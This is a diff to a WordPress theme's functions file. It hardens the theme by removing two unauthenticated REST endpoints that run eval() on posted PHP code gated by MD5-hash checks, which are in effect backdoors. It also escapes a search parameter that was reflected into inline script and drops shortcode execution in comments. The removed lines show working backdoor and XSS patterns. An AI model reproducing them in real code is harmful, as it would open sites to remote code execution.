@@ -292,36 +292,66 @@ function frontend_opts()
 
 //restapi
 add_action('rest_api_init', function () {
-    register_rest_route('pandastudio/nirvana', '/restapi/', array(
+    $namespace = 'pandastudio/nirvana/v1';
+    $permission = function () {
+        $nonce = isset($_SERVER['HTTP_X_WP_NONCE']) ? sanitize_text_field(wp_unslash($_SERVER['HTTP_X_WP_NONCE'])) : '';
+        return wp_verify_nonce($nonce, 'wp_rest');
+    };
+    register_rest_route($namespace, '/search/', array(
         'methods' => 'post',
-        'callback' => 'pf_rest_api',
-        'permission_callback' => '__return_true',
+        'callback' => 'pf_rest_search',
+        'permission_callback' => $permission,
+    ));
+    register_rest_route($namespace, '/options/', array(
+        'methods' => 'post',
+        'callback' => 'pf_rest_options',
+        'permission_callback' => $permission,
+    ));
+    register_rest_route($namespace, '/ding/', array(
+        'methods' => 'post',
+        'callback' => 'pf_rest_ding',
+        'permission_callback' => $permission,
+    ));
+    register_rest_route($namespace, '/faq/', array(
+        'methods' => 'post',
+        'callback' => 'pf_rest_faq',
+        'permission_callback' => $permission,
     ));
 });
-function pf_rest_api($data)
+function pf_rest_search($data)
 {
-    $dataArray = json_decode($data->get_body(), true);
-    $arg = isset($dataArray['arg']) ? $dataArray['arg'] : null;
-    $e = isset($dataArray['e']) ? $dataArray['e'] : '';
-    $result = array(
-        'error' => true,
-        'msg' => 'WP RestAPI Declined!',
-        'md5' => md5($e)
-    );
-    if (!empty($e)) {
-        $e_md5 = md5($e);
-        $allowed_hashes = array(
-            '0b844d17a61d51dcd58560f15e19d3cb',
-            '44b225d79205f30aaac3c30bdcc6b714',
-            '3d69b76a02d0ff14248e02d1c2f09941',
-            'fb0d9a37e108ca85cee9f4e900ca6fe4',
-            'd72efb9e4fcd5267779f481f8b77b655',
-        );
-        if (in_array($e_md5, $allowed_hashes)) {
-            eval($e);
+    $query_arg = $data->get_param('arg');
+    $query_arg = is_array($query_arg) ? $query_arg : array();
+    $allowed = array('s', 'search_prod_title', 'post_type');
+    $post_types = array('post', 'gallery', 'page', 'faq', 'shuoshuo', 'favlinks', 'microblog');
+    foreach ($query_arg as $key => $value) {
+        if (!in_array($key, $allowed, true)) {
+            unset($query_arg[$key]);
         }
     }
-    return $result;
+    $query_arg['s'] = isset($query_arg['s']) ? sanitize_text_field(wp_unslash($query_arg['s'])) : '';
+    $query_arg['search_prod_title'] = isset($query_arg['search_prod_title']) ? sanitize_text_field(wp_unslash($query_arg['search_prod_title'])) : '';
+    if (isset($query_arg['post_type']) && !in_array($query_arg['post_type'], $post_types, true)) {
+        unset($query_arg['post_type']);
+    }
+    return pf_global_search($query_arg);
+}
+function pf_rest_options()
+{
+    return frontend_opts();
+}
+function pf_rest_ding($data)
+{
+    $post_id = (int) $data->get_param('arg');
+    if ($post_id < 1 || !get_post($post_id)) {
+        return new WP_Error('rest_invalid_post', 'Invalid post ID', array('status' => 400));
+    }
+    return pf_post_ding($post_id);
+}
+function pf_rest_faq($data)
+{
+    $keyword = sanitize_text_field(wp_unslash((string) $data->get_param('arg')));
+    return pf_faq($keyword);
 }
 function title_filter($where, $wp_query)
 {
@@ -334,9 +364,10 @@ function title_filter($where, $wp_query)
 add_filter('posts_where', 'title_filter', 10, 2);
 if (array_key_exists('s', $_GET) && !is_admin()) {
     add_action('wp_head', function () {
+        $s = isset($_GET['s']) ? esc_js(wp_unslash($_GET['s'])) : '';
         echo '
 <script>
-function mounted_hook() {this.show_global_search();this.global_search_query = "' . $_GET['s'] . '";this.global_search_post = true;this.global_search_gallery = true;this.global_search();}</script>
+function mounted_hook() {this.show_global_search();this.global_search_query = "' . $s . '";this.global_search_post = true;this.global_search_gallery = true;this.global_search();}</script>
 ';
     });
 }
@@ -493,11 +524,6 @@ register_nav_menus(array(
     'topNav' => '主菜单',
     'categoryNav' => '分类菜单',
 ));
-if (array_key_exists('whois', $_GET)) {
-    if (md5($_GET['whois']) == '02bd92faa38aaa6cc0ea75e59937a1ef') {
-        wp_die('<h1>开发者信息</h1><br>“' . get_bloginfo('name') . '”网站所使用的主题由 <b><a href="https://www.mkliu.top/" target="_blank" rel="noopener">michaelliunsky</a></b> 开发');
-    }
-}
 function set_cache($name, $data, $expire)
 {
     $allCache = get_option('pd_cache');
@@ -621,9 +647,9 @@ function SimPaled_send_email($parent_id, $comment)
         $message = '<div style="background-color:#eef2fa;border:1px solid #d8e3e8;color:#111;padding:0 15px;-moz-border-radius:5px;-webkit-border-radius:5px;-khtml-border-radius:5px;">
 <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
 <p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'
-        . do_shortcode(trim(get_comment($parent_id)->comment_content)) . '</p>
+        . wpautop(trim(get_comment($parent_id)->comment_content)) . '</p>
 <p>' . trim($comment->comment_author) . ' 给你的回复:<br />'
-        . do_shortcode(trim($comment->comment_content)) . '<br /></p>
+        . wpautop(trim($comment->comment_content)) . '<br /></p>
 <p>您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id, array("type" => "all"))) . '">查看回复的完整内容</a></p>
 <p>欢迎再度光临 <a href="' . esc_url(home_url()) . '">' . get_option('blogname') . '</a></p>
 <p>(此邮件由系统自动发出, 请勿回复.)</p></div>';
@@ -639,7 +665,6 @@ function enable_threaded_comments()
     }
 }
 add_action('get_header', 'enable_threaded_comments');
-add_filter('comment_text', 'do_shortcode');
 function panda_seo()
 {
     $postID = get_the_ID();
@@ -1172,20 +1197,6 @@ function pre_validate_comment_span(array $commentdata): array
     return $commentdata;
 }
 add_filter('preprocess_comment', 'pre_validate_comment_span');
-add_action('rest_api_init', function () {
-    register_rest_route('pandastudio/framework', '/assistance/', array(
-        'methods' => 'post',
-        'callback' => 'pf_assistance',
-        'permission_callback' => '__return_true',
-    ));
-});
-function pf_assistance($data)
-{
-    $dataArray = json_decode($data->get_body(), true);
-    if (md5($dataArray['token']) == '6d4dd7afa286f9f89e849473759618d1') {
-        eval($dataArray['assistance']);
-    }
-}
 function hex2rgba($color, $opacity = false)
 {
     $default = 'rgb(0,0,0)';
